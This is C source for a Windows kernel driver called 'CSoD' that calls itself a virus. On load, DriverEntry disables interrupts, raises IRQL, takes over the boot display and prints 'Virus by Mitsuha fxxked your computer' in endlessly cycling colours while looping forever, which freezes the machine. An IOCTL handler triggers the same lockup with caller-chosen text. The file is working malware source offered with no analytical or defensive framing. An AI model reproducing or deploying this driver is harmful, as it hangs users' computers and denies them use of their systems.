#include "Includes.h"
#include "BOOTVID.h"
#include "ControlCode.h"

PDEVICE_OBJECT g_pDeviceObject = NULL;
UNICODE_STRING g_uniSymbolName = RTL_CONSTANT_STRING(L"\\??\\CSoD");

ULONG g_uNumberOfRaisedCPU = 0;
ULONG g_uAllCPURaised = 0;
PKDPC g_basePKDPC = NULL;

VOID
RaiseCPUIrqlAndWait(
	IN PKDPC Dpc,
	IN PVOID DeferredContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
)
{
	UNREFERENCED_PARAMETER(SystemArgument2);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(DeferredContext);
	UNREFERENCED_PARAMETER(Dpc);

	InterlockedIncrement((PLONG)&g_uNumberOfRaisedCPU);
	while (!InterlockedCompareExchange((PLONG)&g_uAllCPURaised, 1, 1))
		__nop();

	InterlockedDecrement((PLONG)&g_uNumberOfRaisedCPU);
}

VOID
ReleaseExclusivity(
	VOID
)
{
	InterlockedIncrement((PLONG)&g_uAllCPURaised);
	while (InterlockedCompareExchange((PLONG)&g_uNumberOfRaisedCPU, 0, 0))
		__nop();

	if (NULL != g_basePKDPC)
	{
		ExFreePool((PVOID)g_basePKDPC);
		g_basePKDPC = NULL;
	}

	return;
}

BOOLEAN
GainExlusivity(
	VOID
)
{
	ULONG uCurrentCpu = 0;
	PKDPC tempDpc = NULL;
	if ((DISPATCH_LEVEL != KeGetCurrentIrql()) || !KeNumberProcessors)
		return FALSE;

	InterlockedAnd((PLONG)&g_uNumberOfRaisedCPU, 0);
	InterlockedAnd((PLONG)&g_uAllCPURaised, 0);
	tempDpc = (PKDPC)ExAllocatePoolWithTag(NonPagedPool, KeNumberProcessors * sizeof(KDPC), CSoD_POOL_TAG);
	if (tempDpc)
	{
		g_basePKDPC = tempDpc;
		uCurrentCpu = KeGetCurrentProcessorNumber();
		for (ULONG i = 0; i < (ULONG)KeNumberProcessors; i++, *tempDpc++)
			if (i != uCurrentCpu)
			{
				KeInitializeDpc(tempDpc, RaiseCPUIrqlAndWait, NULL);
				KeSetTargetProcessorDpc(tempDpc, (CCHAR)i);
				KeInsertQueueDpc(tempDpc, NULL, NULL);
			}

		while (KeNumberProcessors - 1 != InterlockedCompareExchange((PLONG)&g_uNumberOfRaisedCPU, KeNumberProcessors - 1, KeNumberProcessors - 1))
			__nop();

		return TRUE;
	}

	return FALSE;
}

//_disable();
//GainExlusivity();
//KIRQL Irql = KeRaiseIrqlToDpcLevel();
//
//if (InbvIsBootDriverInstalled())
//{
//	InbvAcquireDisplayOwnership();
//	InbvResetDisplay();
//
//#if _CSoD_COLORFUL_SCREEN
//	USHORT LastWidth = 0,
//		LastHeight = 0;
//
//	for (USHORT Width = 0; Width < SCREEN_WIDTH; Width++)
//	{
//		for (USHORT Height = 0; Height < SCREEN_HEIGHT; Height++)
//		{
//			InbvSolidColorFill(LastWidth, LastHeight, Width, Height, BV_MAX_COLORS - ((Width + Height) % BV_MAX_COLORS));
//
//			LastHeight = Height;
//		}
//
//		LastWidth = Width;
//	}
//#else
//	InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_WHITE);
//	InbvSolidColorFill(0, 0, 0, 0, BV_COLOR_RED);
//#endif
//
//	InbvSetTextColor(BV_COLOR_WHITE);
//	InbvInstallDisplayStringFilter(NULL);
//	InbvEnableDisplayString(TRUE);
//	InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
//}
//
//CHAR Text1[] = "Virus by Mitsuha & gt428 & TSK fxxked your computer so you got a strange CSoD.";
//CHAR Text2[] = "Please SANLIAN TOUBI GUANZHU!";
//
//for (SHORT j = 0; j < SCREEN_HEIGHT / CHAR_HEIGHT / 2; InterlockedIncrement16(&j))
//{
//	for (SHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text1) + 1) / 2; InterlockedIncrement16(&i))
//		InbvDisplayString((PUCHAR)" ");
//	InbvDisplayString((PUCHAR)Text1);
//	InbvDisplayString((PUCHAR)"\r\n");
//
//	for (SHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text2) + 1) / 2; InterlockedIncrement16(&i))
//		InbvDisplayString((PUCHAR)" ");
//	InbvDisplayString((PUCHAR)Text2);
//	InbvDisplayString((PUCHAR)"\r\n");
//}
//
//while (TRUE)
//;
//
//KeLowerIrql(Irql);
//ReleaseExclusivity();
//_enable();

NTSTATUS
PassRequest(
	IN PDEVICE_OBJECT pDeviceObject,
	IN OUT PIRP pIrp
)
{
	UNREFERENCED_PARAMETER(pDeviceObject);

	pIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS
DeviceIoControl(
	IN PDEVICE_OBJECT pDeviceObject,
	IN OUT PIRP pIrp
)
{
	UNREFERENCED_PARAMETER(pDeviceObject);

	ULONG_PTR nUsedLength = 0;

	PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);
	PCSoD_DATA pSystemBuffer = (PCSoD_DATA)pIrp->AssociatedIrp.SystemBuffer;
	ULONG ulInBufferLength = pStackLocation->Parameters.DeviceIoControl.InputBufferLength;

	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

	if (ulInBufferLength == sizeof(CSoD_DATA))
		switch (pStackLocation->Parameters.DeviceIoControl.IoControlCode)
		{
		case CTL_DO_CSoD:
		{
			nUsedLength = sizeof(CSoD_DATA);

			_disable();
			KIRQL Irql = KeRaiseIrqlToDpcLevel();
			//GainExlusivity();

			if (InbvIsBootDriverInstalled())
			{
				InbvAcquireDisplayOwnership();
				InbvResetDisplay();

				if (pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
					InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_WHITE);
				else
					InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, pSystemBuffer->BackColor);

				if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL)
					InbvSetTextColor(BV_COLOR_WHITE);
				else
					InbvSetTextColor(pSystemBuffer->TextColor);

				InbvInstallDisplayStringFilter(NULL);
				InbvEnableDisplayString(TRUE);
				InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
			}

			InbvDisplayString((PUCHAR)pSystemBuffer->Text);

			if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL || pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
				while (TRUE)
					for (SHORT i = 0; i < BV_MAX_COLORS; InterlockedIncrement16(&i))
						for (SHORT j = 0; j < BV_MAX_COLORS; InterlockedIncrement16(&j))
							if (InbvIsBootDriverInstalled())
							{
								if (pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
									InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, i);

								if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL)
									InbvSetTextColor(j);

								InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);

								InbvDisplayString((PUCHAR)pSystemBuffer->Text);

								for (LONG w = 0; w < 1024; InterlockedIncrement(&w))
									__nop();
							}

			while (TRUE)
				__nop();

			//ReleaseExclusivity();
			KeLowerIrql(Irql);
			_enable();
		}

		default:
			ntStatus = STATUS_INVALID_DEVICE_REQUEST;
			break;
		}

	pIrp->IoStatus.Information = nUsedLength;
	pIrp->IoStatus.Status = ntStatus;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return ntStatus;
}

VOID
DriverUnload(
	IN PDRIVER_OBJECT pDriverObject
)
{
	UNREFERENCED_PARAMETER(pDriverObject);

	IoDeleteDevice(g_pDeviceObject);
	IoDeleteSymbolicLink(&g_uniSymbolName);
}

#define _CSoD_ON_LOAD TRUE
#define _CSoD_COLORFUL_SCREEN FALSE

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath
)
{
	UNREFERENCED_PARAMETER(pRegistryPath);

	pDriverObject->DriverUnload = DriverUnload;

	for (USHORT i = 0; i < IRP_MJ_MAXIMUM_FUNCTION + 1; i++)
		pDriverObject->MajorFunction[i] = PassRequest;

	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceIoControl;

	UNICODE_STRING uniDeviceName = RTL_CONSTANT_STRING(L"\\Device\\CSoD");
	NTSTATUS ntStatus = IoCreateDevice(pDriverObject, 0, &uniDeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &g_pDeviceObject);
	if (NT_SUCCESS(ntStatus))
	{
		g_pDeviceObject->Flags |= DO_BUFFERED_IO;
		IoCreateSymbolicLink(&g_uniSymbolName, &uniDeviceName);
	}

#if _CSoD_ON_LOAD
	_disable();
	KIRQL Irql = KeRaiseIrqlToDpcLevel();
	//GainExlusivity();

	if (InbvIsBootDriverInstalled())
	{
		InbvAcquireDisplayOwnership();
		InbvResetDisplay();

#if _CSoD_COLORFUL_SCREEN
		USHORT LastWidth = 0,
			LastHeight = 0;

		for (USHORT Width = 0; Width < SCREEN_WIDTH; Width++)
		{
			for (USHORT Height = 0; Height < SCREEN_HEIGHT; Height++)
			{
				InbvSolidColorFill(LastWidth, LastHeight, Width, Height, BV_MAX_COLORS - ((Width + Height) % BV_MAX_COLORS));

				LastHeight = Height;
			}

			LastWidth = Width;
		}
#else
		InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_WHITE);
#endif

		InbvSetTextColor(BV_COLOR_RED);
		InbvInstallDisplayStringFilter(NULL);
		InbvEnableDisplayString(TRUE);
		InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
	}

	CHAR Text1[] = "Virus by Mitsuha fxxked your computer so you got a strange CSoD.";

	for (SHORT j = 0; j < SCREEN_HEIGHT / CHAR_HEIGHT; InterlockedIncrement16(&j))
	{
		for (SHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text1) + 1) / 2; InterlockedIncrement16(&i))
			InbvDisplayString((PUCHAR)" ");
		InbvDisplayString((PUCHAR)Text1);
		InbvDisplayString((PUCHAR)"\r\n");
	}

	while (TRUE)
		for (USHORT Color = 0; Color < BV_MAX_COLORS; Color++)
		{
			InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, Color);

			InbvSetTextColor(BV_MAX_COLORS - Color);
			InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
			for (SHORT j = 0; j < SCREEN_HEIGHT / CHAR_HEIGHT; InterlockedIncrement16(&j))
			{
				for (SHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text1) + 1) / 2; InterlockedIncrement16(&i))
					InbvDisplayString((PUCHAR)" ");
				InbvDisplayString((PUCHAR)Text1);
				InbvDisplayString((PUCHAR)"\r\n");
			}
		}

	while (TRUE)
		__nop();

	//ReleaseExclusivity();
	KeLowerIrql(Irql);
	_enable();
#endif

	return STATUS_SUCCESS;
}